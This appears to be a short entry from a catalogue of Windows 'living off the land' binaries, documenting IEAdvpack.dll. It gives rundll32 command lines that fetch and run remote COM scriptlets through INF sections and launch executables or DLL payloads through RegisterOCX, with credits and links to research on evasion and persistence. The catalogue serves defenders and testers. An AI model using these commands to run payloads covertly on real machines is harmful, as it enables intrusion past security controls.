## Ieadvpack.dll
* Functions: Execute
```

rundll32.exe IEAdvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,
Remote fetch and execute a COM Scriptlet by calling an information file directive (Section name specified).

rundll32.exe IEAdvpack.dll,LaunchINFSection test.inf,,1,
Remote fetch and execute a COM Scriptlet by calling an information file directive (DefaultInstall section implied).

rundll32.exe IEAdvpack.dll,RegisterOCX calc.exe
Launch executable by calling the RegisterOCX function.

rundll32.exe IEAdvpack.dll,RegisterOCX test.dll
Launch a DLL payload by calling the RegisterOCX function.
```
   
* Resources:   
  * https://twitter.com/pabraeken/status/991695411902599168
  * https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
  * https://twitter.com/0rbz_/status/974472392012689408
   
* Full path:   
  * c:\windows\system32\ieadvpack.dll
  * c:\windows\sysWOW64\ieadvpack.dll
   
* Notes: Thanks to Pierre-Alexandre Braeken - @pabraeken (RegisterOCX - Cmd), Jimmy - @bohops (LaunchINFSection), fabrizio - @0rbz_ (RegisterOCX - DLL)  
   
